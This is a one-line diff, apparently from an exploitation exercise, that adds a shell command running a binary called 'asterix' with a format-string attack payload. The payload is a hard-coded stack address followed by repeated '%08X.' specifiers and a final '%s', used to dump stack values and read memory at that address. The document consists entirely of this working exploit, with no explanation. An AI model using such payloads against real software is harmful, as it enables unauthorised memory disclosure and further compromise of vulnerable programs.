@@ -1,0 +1,1 @@
+./asterix $(python2 -c 'print "\x60\xcd\xff\xff" + "%08X." *19 +"%s"')
